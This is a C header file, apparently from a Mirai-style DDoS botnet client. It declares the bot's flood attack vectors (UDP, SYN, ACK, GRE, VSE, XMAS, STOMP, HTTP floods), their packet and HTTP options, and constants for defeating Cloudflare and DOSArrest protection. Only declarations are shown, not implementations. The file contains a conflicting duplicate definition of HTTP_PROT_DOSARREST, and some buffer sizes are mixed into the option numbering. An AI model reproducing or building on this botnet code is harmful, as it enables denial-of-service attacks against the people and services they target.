#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   15
struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
#define ATK_VEC_UDP        0
#define ATK_VEC_SYN        1
#define ATK_VEC_ACK        2
#define ATK_VEC_UDP_PLAIN  3
#define ATK_VEC_STD        4
#define ATK_VEC_GREIP      5
#define ATK_VEC_VSE        6
#define ATK_VEC_HTTPNULL   7
#define ATK_VEC_HEX        8
#define ATK_VEC_STOMP      9
#define ATK_VEC_XMAS      10
#define ATK_VEC_SOCKET    11
#define ATK_VEC_BYPASS    12
#define ATK_VEC_NUDP      13

#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_DNS_HDR_ID      9
#define ATK_OPT_URG             11
#define ATK_OPT_ACK             12
#define ATK_OPT_PSH             13
#define ATK_OPT_RST             14
#define ATK_OPT_SYN             15
#define ATK_OPT_FIN             16
#define ATK_OPT_SEQRND          17
#define ATK_OPT_ACKRND          18
#define ATK_OPT_GRE_CONSTIP     19
#define ATK_OPT_SOURCE          20
#define ATK_OPT_MIN_SIZE        21 
#define ATK_OPT_MAX_SIZE        22

#define ATK_OP_POST_DATA        23
#define ATK_OPT_METHOD          24
#define ATK_OPT_PATH            25
#define ATK_OPT_CONNS           26
#define HTTP_PATH_MAX           27
#define HTTP_DOMAIN_MAX         28
#define HTTP_CONNECTION_MAX     29
#define HTTP_CONN_INIT          30

#define TABLE_HTTP_ONE          31
#define TABLE_HTTP_TWO          32 
#define TABLE_HTTP_THREE        33
#define TABLE_HTTP_FOUR         34
#define TABLE_HTTP_FIVE         35
#define TABLE_HTTP_SIX          36
#define TABLE_HTTP_SEVEN        37
#define TABLE_HTTP_EIGHT        38
#define TABLE_HTTP_NINE         39
#define TABLE_HTTP_TEN          40
#define TABLE_HTTP_ELEVEN       41
#define TABLE_HTTP_TWELVE       42
#define TABLE_HTTP_THIRTEEN     43
#define TABLE_HTTP_FOURTEEN     44
#define TABLE_HTTP_FIVETEEN     45
#define TABLE_HTTP_SIXTEEN      46
#define TABLE_HTTP_SEVENTEEN    47
#define TABLE_HTTP_EIGHTEEN     48
#define TABLE_HTTP_NINETEEN     49
#define TABLE_HTTP_TWENTY       50

#define HTTP_CONN_RESTART       51
#define HTTP_CONN_SEND          52
#define HTTP_CONN_CONNECTING    53
#define HTTP_RDBUF_SIZE         54

#define TABLE_ATK_KEEP_ALIVE    55
#define TABLE_ATK_ACCEPT        56
#define TABLE_ATK_ACCEPT_LNG    57
#define TABLE_ATK_CONTENT_TYPE  58
#define HTTP_CONN_RECV_HEADER   59
#define HTTP_CONN_RECV_BODY     60
#define HTTP_CONN_QUEUE_RESTART 61
#define HTTP_CONN_CLOSED        62

#define HTTP_PROT_CLOUDFLARE    63
#define HTTP_PROT_DOSARREST     64
#define HTTP_PROT_DOSARREST     65
#define HTTP_COOKIE_MAX         66
#define HTTP_COOKIE_LEN_MAX     67
#define HTTP_HACK_DRAIN         68
#define TABLE_ATK_RESOLVER      69
#define TABLE_ATK_NSERV         70

#define ATK_OPT_POST_DATA       71
#define HTTP_POST_MAX           72

struct attack_http_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char path[HTTP_PATH_MAX + 1];
    char domain[HTTP_DOMAIN_MAX + 1];
    char postdata[HTTP_POST_MAX + 1];
    char method[9];
    char orig_method[9];

    int protection_type;

    int keepalive;
    int chunked;
    int content_length;

    int num_cookies;
    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];

    int rdbuf_pos;
    char rdbuf[HTTP_RDBUF_SIZE];
};



struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};
struct attack_xmas_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};
struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};
BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
void attack_method_udpgeneric(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpxmas(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_nudp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_httpnull(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_socket(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_kill();
void attack_method_tcpsyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_greip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpvse(uint8_t, struct attack_target *, uint8_t, struct attack_option *); 
void attack_udp_hex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
